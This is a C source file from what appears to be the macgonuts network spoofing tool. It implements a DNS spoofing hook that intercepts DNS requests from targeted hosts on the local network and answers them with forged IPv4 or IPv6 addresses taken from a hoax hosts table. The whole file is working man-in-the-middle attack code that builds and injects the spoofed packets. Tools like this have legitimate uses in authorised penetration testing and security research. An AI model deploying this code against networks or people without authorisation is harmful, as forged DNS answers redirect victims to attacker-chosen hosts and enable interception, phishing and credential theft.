/*
 * Copyright (c) 2023, Rafael Santiago
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree.
 */
#include <cmd/hooks/macgonuts_dnsspoof_redirect_hook.h>
#include <cmd/macgonuts_dnsspoof_defs.h>
#include <macgonuts_redirect.h>
#include <macgonuts_ethfrm.h>
#include <macgonuts_ip4hdr.h>
#include <macgonuts_ip6hdr.h>
#include <macgonuts_udphdr.h>
#include <macgonuts_dnshdr.h>
#include <macgonuts_dnsconv.h>
#include <macgonuts_iplist.h>
#include <macgonuts_etc_hoax.h>
#include <macgonuts_socket.h>
#include <macgonuts_status_info.h>

#define ETH_FRM_SIZE 14

static int do_dnsspoof4(macgonuts_socket_t rsk, macgonuts_etc_hoax_handle *etc_hoax,
                        const uint32_t dns_answer_ttl, const unsigned char *ethfrm, const size_t ethfrm_size);

static int do_dnsspoof6(macgonuts_socket_t rsk, macgonuts_etc_hoax_handle *etc_hoax,
                        const uint32_t dns_answer_ttl, const unsigned char *ethfrm, const size_t ethfrm_size);

static int do_dnsspoof_layer4to7(struct macgonuts_udphdr_ctx *udphdr,
                                 struct macgonuts_dnshdr_ctx *dnshdr,
                                 macgonuts_etc_hoax_handle *etc_hoax,
                                 const uint32_t dns_answer_ttl,
                                 uint8_t *data4, const size_t data4_size);

int macgonuts_dnsspoof_redirect_hook(struct macgonuts_spoofing_guidance_ctx *spfgd,
                                     const unsigned char *ethfrm, const size_t ethfrm_size) {
    int (*do_dnsspoof)(macgonuts_socket_t, macgonuts_etc_hoax_handle *, const uint32_t,
                       const unsigned char *, const size_t) = NULL;
    uint8_t *in_addr = NULL;
    size_t in_addr_size = 0;
    uint16_t ether_type = 0;
    int err = EXIT_FAILURE;

    assert(spfgd != NULL
           && ethfrm != NULL
           && ethfrm_size > ETH_FRM_SIZE);

    if (!macgonuts_is_dnsreq(ethfrm, ethfrm_size)) {
        return macgonuts_redirect(spfgd->handles.wire, &spfgd->layers, ethfrm, ethfrm_size, NULL);
    }

    ether_type = (uint16_t) ethfrm[12] << 8 | (uint16_t) ethfrm[13];

    switch (ether_type) {
        case MACGONUTS_ETHER_TYPE_IP4:
            do_dnsspoof = do_dnsspoof4;
            in_addr = (uint8_t *)&ethfrm[26];
            in_addr_size = 4;
            break;

        case MACGONUTS_ETHER_TYPE_IP6:
            do_dnsspoof = do_dnsspoof6;
            in_addr = (uint8_t *)&ethfrm[23];
            in_addr_size = 16;
            break;

        default:
            // INFO(Rafael): It should never happen in normal conditions.
            return macgonuts_redirect(spfgd->handles.wire, &spfgd->layers, ethfrm, ethfrm_size, NULL);
    }

    assert(do_dnsspoof != NULL);

    if (!macgonuts_iplist_has(macgonuts_dnsspoof_iplist(spfgd), in_addr, in_addr_size)) {
        return macgonuts_redirect(spfgd->handles.wire, &spfgd->layers, ethfrm, ethfrm_size, NULL);
    }

    err = do_dnsspoof(spfgd->handles.wire,
                      macgonuts_dnsspoof_etc_hoax(spfgd),
                      macgonuts_dnsspoof_ttl(spfgd),
                      ethfrm, ethfrm_size);

    if (err == EADDRNOTAVAIL) {
        err = macgonuts_redirect(spfgd->handles.wire, &spfgd->layers, ethfrm, ethfrm_size, NULL);
    }

    return err;
}

static int do_dnsspoof4(macgonuts_socket_t rsk, macgonuts_etc_hoax_handle *etc_hoax,
                        const uint32_t dns_answer_ttl, const unsigned char *ethfrm, const size_t ethfrm_size) {
    struct macgonuts_ethfrm_ctx eth = { 0 };
    struct macgonuts_ip4hdr_ctx ip4 = { 0 };
    struct macgonuts_ip4_pseudo_hdr_ctx ip4p = { 0 };
    struct macgonuts_udphdr_ctx udp = { 0 };
    struct macgonuts_dnshdr_ctx dns = { 0 };
    int err = macgonuts_read_ethernet_frm(&eth, ethfrm, ethfrm_size);

    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof4_epilogue;
    }

    err = macgonuts_read_ip4_pkt(&ip4, eth.data, eth.data_size);
    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof4_epilogue;
    }

    err = do_dnsspoof_layer4to7(&udp, &dns, etc_hoax, dns_answer_ttl, ip4.payload, ip4.payload_size);

    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof4_epilogue;
    }

    memcpy(&ip4p.src_addr[0], &ip4.src_addr, sizeof(ip4p.src_addr));
    memcpy(&ip4p.dest_addr[0], &ip4.dest_addr, sizeof(ip4p.dest_addr));
    ip4p.zprotolen[1] = 0x11;
    ip4p.zprotolen[2] = (udp.len >> 8) & 0xFF;
    ip4p.zprotolen[3] = udp.len & 0xFF;

    assert(ip4.payload != NULL);

    free(ip4.payload);
    ip4.payload = macgonuts_make_udp_pkt(&udp, &ip4.payload_size, &ip4p, sizeof(ip4p));
    if (ip4.payload == NULL) {
        err = ENOMEM;
        goto do_dnsspoof4_epilogue;
    }

    assert(eth.data != NULL);
    free(eth.data);
    eth.data = macgonuts_make_ip4_pkt(&ip4, &eth.data_size, 1);
    if (eth.data == NULL) {
        err = ENOMEM;
        goto do_dnsspoof4_epilogue;
    }

    err = macgonuts_sendpkt(rsk, eth.data, eth.data_size);

do_dnsspoof4_epilogue:

    if (dns.qd != NULL || dns.an != NULL) {
        macgonuts_release_dnshdr(&dns);
    }

    if (udp.payload != NULL) {
        macgonuts_release_udphdr(&udp);
    }

    if (ip4.payload != NULL) {
        macgonuts_release_ip4hdr(&ip4);
    }

    if (eth.data != NULL) {
        macgonuts_release_ethfrm(&eth);
    }

    return err;
}

static int do_dnsspoof6(macgonuts_socket_t rsk, macgonuts_etc_hoax_handle *etc_hoax,
                        const uint32_t dns_answer_ttl, const unsigned char *ethfrm, const size_t ethfrm_size) {
    struct macgonuts_ethfrm_ctx eth = { 0 };
    struct macgonuts_ip6hdr_ctx ip6 = { 0 };
    struct macgonuts_ip6_pseudo_hdr_ctx ip6p = { 0 };
    struct macgonuts_udphdr_ctx udp = { 0 };
    struct macgonuts_dnshdr_ctx dns = { 0 };
    size_t payload_size = 0;
    int err = macgonuts_read_ethernet_frm(&eth, ethfrm, ethfrm_size);
    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof6_epilogue;
    }

    err = macgonuts_read_ip6_pkt(&ip6, eth.data, eth.data_size);
    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof6_epilogue;
    }

    err = do_dnsspoof_layer4to7(&udp, &dns, etc_hoax, dns_answer_ttl, ip6.payload, ip6.payload_length);

    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof6_epilogue;
    }

    memcpy(&ip6p.src_addr[0], ip6.src_addr, sizeof(ip6p.src_addr));
    memcpy(&ip6p.dest_addr[0], ip6.dest_addr, sizeof(ip6p.dest_addr));
    ip6p.upper_layer_pkt_len[2] = (udp.len >> 8) & 0xFF;
    ip6p.upper_layer_pkt_len[3] = udp.len & 0xFF;
    ip6p.next_header[3] = ip6.next_header;

    assert(ip6.payload != NULL);

    free(ip6.payload);
    ip6.payload = macgonuts_make_udp_pkt(&udp, &payload_size, &ip6p, sizeof(ip6p));
    if (ip6.payload == NULL) {
        err = ENOMEM;
        goto do_dnsspoof6_epilogue;
    }
    ip6.payload_length = payload_size & 0xFFFF;

    assert(eth.data != NULL);

    free(eth.data);
    eth.data = macgonuts_make_ethernet_frm(&eth, &eth.data_size);
    if (eth.data == NULL) {
        err = ENOMEM;
        goto do_dnsspoof6_epilogue;
    }

    err = macgonuts_sendpkt(rsk, eth.data, eth.data_size);

do_dnsspoof6_epilogue:

    if (dns.qd != NULL || dns.an != NULL) {
        macgonuts_release_dnshdr(&dns);
    }

    if (udp.payload != NULL) {
        macgonuts_release_udphdr(&udp);
    }

    if (ip6.payload != NULL) {
        macgonuts_release_ip6hdr(&ip6);
    }

    if (eth.data != NULL) {
        macgonuts_release_ethfrm(&eth);
    }

    return err;
}

static int do_dnsspoof_layer4to7(struct macgonuts_udphdr_ctx *udphdr,
                                 struct macgonuts_dnshdr_ctx *dnshdr,
                                 macgonuts_etc_hoax_handle *etc_hoax,
                                 const uint32_t dns_answer_ttl,
                                 uint8_t *data4, const size_t data4_size) {
    int err = EADDRNOTAVAIL;
    struct macgonuts_dns_rr_hdr_ctx *qp = NULL;
    uint8_t in_addr[16] = { 0 };
    size_t in_addr_size = 0;

    err = macgonuts_read_udp_pkt(udphdr, data4, data4_size);
    if (err != EXIT_SUCCESS) {
        return err;
    }

    err = macgonuts_read_dns_pkt(dnshdr, udphdr->payload, udphdr->payload_size);
    if (err != EXIT_SUCCESS) {
        return err;
    }

    if (dnshdr->qdcount == 0 || dnshdr->qd == NULL) {
        return EINVAL;
    }

    err = ENOENT;
    for (qp = dnshdr->qd; qp != NULL && err != EXIT_SUCCESS; qp = qp->next) {
        err = macgonuts_gethostbyname(in_addr, sizeof(in_addr), &in_addr_size, etc_hoax,
                                      (char *)qp->name, qp->name_size);
    }

    if (err != EXIT_SUCCESS) {
        return EADDRNOTAVAIL;
    }

    err =  macgonuts_add_dns_answer(dnshdr, in_addr, in_addr_size, dns_answer_ttl);
    if (err != EXIT_SUCCESS) {
        return err;
    }

    assert(udphdr->payload != NULL);

    free(udphdr->payload);
    udphdr->payload = macgonuts_make_dns_pkt(dnshdr, &udphdr->payload_size);
    if (udphdr->payload == NULL) {
        err = ENOMEM;
    }

    return err;
}

#undef ETH_FRM_SIZE
